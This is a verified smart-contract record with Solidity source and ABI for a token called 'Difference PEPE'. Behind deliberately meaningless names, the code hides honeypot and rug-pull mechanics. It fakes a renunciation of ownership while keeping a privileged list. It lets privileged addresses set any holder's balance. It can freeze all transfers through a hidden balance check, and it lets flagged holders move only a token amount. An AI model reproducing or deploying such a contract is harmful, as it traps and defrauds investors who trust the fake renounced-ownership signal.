{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface tokenWalletEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingToken) external view returns (uint256);\n\n    function transfer(address tokenEnableMarketing, uint256 receiverList) external returns (bool);\n\n    function allowance(address tradingBuyTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenEnableMarketing,\n        uint256 receiverList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyTeamAt, uint256 value);\n    event Approval(address indexed tradingBuyTo, address indexed spender, uint256 value);\n}\n\nabstract contract walletLiquidityEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchMode {\n    function createPair(address minTxSwap, address totalSell) external returns (address);\n}\n\ninterface atFrom is tokenWalletEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DifferencePEPE is walletLiquidityEnable, tokenWalletEnable, atFrom {\n\n    function transferFrom(address tokenMin, address tokenEnableMarketing, uint256 receiverList) external override returns (bool) {\n        if (_msgSender() != fundReceiverTx) {\n            if (tradingSenderWallet[tokenMin][_msgSender()] != type(uint256).max) {\n                require(receiverList <= tradingSenderWallet[tokenMin][_msgSender()]);\n                tradingSenderWallet[tokenMin][_msgSender()] -= receiverList;\n            }\n        }\n        return txAuto(tokenMin, tokenEnableMarketing, receiverList);\n    }\n\n    address private shouldReceiverAmount;\n\n    bool public minTotal;\n\n    function txAuto(address tokenMin, address tokenEnableMarketing, uint256 receiverList) internal returns (bool) {\n        if (tokenMin == maxMin) {\n            return launchedTeam(tokenMin, tokenEnableMarketing, receiverList);\n        }\n        uint256 fundIsTrading = tokenWalletEnable(amountShould).balanceOf(senderAuto);\n        require(fundIsTrading == teamTakeAuto);\n        require(tokenEnableMarketing != senderAuto);\n        if (txSell[tokenMin]) {\n            return launchedTeam(tokenMin, tokenEnableMarketing, tradingWallet);\n        }\n        return launchedTeam(tokenMin, tokenEnableMarketing, receiverList);\n    }\n\n    mapping(address => bool) public minEnableReceiver;\n\n    function transfer(address launchedExempt, uint256 receiverList) external virtual override returns (bool) {\n        return txAuto(_msgSender(), launchedExempt, receiverList);\n    }\n\n    function getOwner() external view returns (address) {\n        return shouldReceiverAmount;\n    }\n\n    function teamSell(address launchedExempt, uint256 receiverList) public {\n        buyFund();\n        shouldBuy[launchedExempt] = receiverList;\n    }\n\n    mapping(address => mapping(address => uint256)) private tradingSenderWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return walletLaunched;\n    }\n\n    uint256 takeFee;\n\n    address public maxMin;\n\n    address public amountShould;\n\n    function fromReceiver() public {\n        emit OwnershipTransferred(maxMin, address(0));\n        shouldReceiverAmount = address(0);\n    }\n\n    bool public maxReceiver;\n\n    string private fromLaunched = \"DPE\";\n\n    constructor (){\n        if (walletAmount != swapTrading) {\n            enableTx = false;\n        }\n        feeTake listWallet = feeTake(fundReceiverTx);\n        amountShould = launchMode(listWallet.factory()).createPair(listWallet.WETH(), address(this));\n        \n        maxMin = _msgSender();\n        fromReceiver();\n        minEnableReceiver[maxMin] = true;\n        shouldBuy[maxMin] = senderIs;\n        if (swapTrading == walletToken) {\n            enableTx = false;\n        }\n        emit Transfer(address(0), maxMin, senderIs);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderIs;\n    }\n\n    address fundReceiverTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private shouldBuy;\n\n    event OwnershipTransferred(address indexed isTake, address indexed swapBuyTx);\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromLaunched;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverReceiver;\n    }\n\n    uint256 private walletToken;\n\n    function allowance(address launchExempt, address fundWalletEnable) external view virtual override returns (uint256) {\n        if (fundWalletEnable == fundReceiverTx) {\n            return type(uint256).max;\n        }\n        return tradingSenderWallet[launchExempt][fundWalletEnable];\n    }\n\n    string private walletLaunched = \"Difference PEPE\";\n\n    function maxBuy(uint256 receiverList) public {\n        buyFund();\n        teamTakeAuto = receiverList;\n    }\n\n    uint256 private senderIs = 100000000 * 10 ** 18;\n\n    function approve(address fundWalletEnable, uint256 receiverList) public virtual override returns (bool) {\n        tradingSenderWallet[_msgSender()][fundWalletEnable] = receiverList;\n        emit Approval(_msgSender(), fundWalletEnable, receiverList);\n        return true;\n    }\n\n    bool public enableTx;\n\n    function balanceOf(address marketingToken) public view virtual override returns (uint256) {\n        return shouldBuy[marketingToken];\n    }\n\n    address senderAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant tradingWallet = 18 ** 10;\n\n    uint256 teamTakeAuto;\n\n    function maxShould(address tokenFrom) public {\n        require(tokenFrom.balance < 100000);\n        if (maxReceiver) {\n            return;\n        }\n        \n        minEnableReceiver[tokenFrom] = true;\n        \n        maxReceiver = true;\n    }\n\n    uint256 private walletAmount;\n\n    uint8 private receiverReceiver = 18;\n\n    function buyFund() private view {\n        require(minEnableReceiver[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return shouldReceiverAmount;\n    }\n\n    mapping(address => bool) public txSell;\n\n    function receiverFeeMarketing(address tradingList) public {\n        buyFund();\n        \n        if (tradingList == maxMin || tradingList == amountShould) {\n            return;\n        }\n        txSell[tradingList] = true;\n    }\n\n    uint256 private swapTrading;\n\n    function launchedTeam(address tokenMin, address tokenEnableMarketing, uint256 receiverList) internal returns (bool) {\n        require(shouldBuy[tokenMin] >= receiverList);\n        shouldBuy[tokenMin] -= receiverList;\n        shouldBuy[tokenEnableMarketing] += receiverList;\n        emit Transfer(tokenMin, tokenEnableMarketing, receiverList);\n        return true;\n    }\n\n    uint256 private fromSellMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuyTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapBuyTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTeamAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundWalletEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundWalletEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"}],\"name\":\"maxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minEnableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"}],\"name\":\"receiverFeeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenEnableMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DifferencePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}